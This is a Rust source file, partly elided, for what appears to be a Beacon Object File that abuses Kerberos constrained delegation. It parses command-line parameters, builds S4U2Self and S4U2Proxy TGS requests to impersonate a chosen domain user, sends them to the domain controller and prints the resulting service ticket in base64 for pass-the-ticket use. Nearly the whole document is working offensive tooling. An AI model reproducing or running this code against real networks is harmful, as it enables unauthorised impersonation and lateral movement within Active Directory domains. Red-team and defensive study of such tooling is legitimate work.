//! # S4U BOF
//!
//! Performs S4U2Self and S4U2Proxy constrained delegation abuse via
//! TGS-REQ with PA-FOR-USER PA-DATA for impersonation.
//!
//! ## MITRE ATT&CK
...
fn build_tgs_req(
    ...
    if let Some(user) = s4u_user {
        ...
        checksum_input.extend_from_slice(domain.as_bytes());
    ...
    if additional_ticket.is_some() {
        let pac_options = asn_seq(&[&asn_ctx(0, &asn_bit(&[0x40, 0, 0, 0]))]);
        pa_data.push(asn_seq(&[
            &asn_ctx_int(1, 167),
...
fn main(args: *mut u8, len: usize) {
    ...
    if len == 0 {
        eprintln!("[X] /ticket:BASE64 and /impersonateuser:USER or /tgs:BASE64 required");
        return;
    }
    ...
    let impersonate_user = get_param(&params, "/impersonateuser:");
    let supplied_tgs = get_param(&params, "/tgs:");
    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");
    let self_only = params.contains("/self");
    if impersonate_user.is_some() == supplied_tgs.is_some() {
        eprintln!("[X] Supply either /impersonateuser:USER or /tgs:BASE64, but not both");
        return;
    }
    if !self_only && service.is_none() {
        eprintln!("[X] /service:SPN must be supplied unless /self is used");
        return;
    }
    if get_param(&params, "/altservice:").is_some() {
        eprintln!("[X] /altservice is not supported by this build");
        return;
    }
    ...
    let evidence_ticket = if let Some(user) = impersonate_user {
        println!("[*] Building S4U2Self request for: {}", user);
        let request = match build_tgs_req(&api, &kirbi, &kirbi.username, &domain, Some(user), None)
        {
            Some(request) => request,
            None => {
                eprintln!("[X] Failed to build S4U2Self TGS-REQ");
                return;
            }
        };
        ...
        let ticket = match handle_tgs_rep(&api, &response, &kirbi) {
            Some(ticket) => ticket,
            None => return,
        };
        println!("[+] S4U2Self request successful");
        if self_only {
        ...
        String::from(supplied_tgs.unwrap_or_default())
    };

    let evidence = match parse_kirbi(&evidence_ticket) {
        Some(ticket) => ticket,
        None => {
            eprintln!("[X] Failed to parse S4U2Self evidence ticket");
            return;
        }
    };
    let service = service.unwrap_or_default();
    println!("[*] Building S4U2Proxy request for: {}", service);
    let request = match build_tgs_req(
        &api,
        &kirbi,
        service,
        &domain,
        None,
        Some(&evidence.ticket_raw),
    ) {
        Some(request) => request,
        None => {
            eprintln!("[X] Failed to build S4U2Proxy TGS-REQ");
            return;
        }
    };
    let response = match send_to_kdc(&dc, &request) {
    ...
    match handle_tgs_rep(&api, &response, &kirbi) {
        Some(ticket) => {
            println!("[+] S4U2Proxy request successful");
            println!("[*] base64(ticket.kirbi):\n\n{}\n", ticket);
            if params.contains("/ptt") {
                println!("[*] Import the ticket with the ptt BOF");
            }
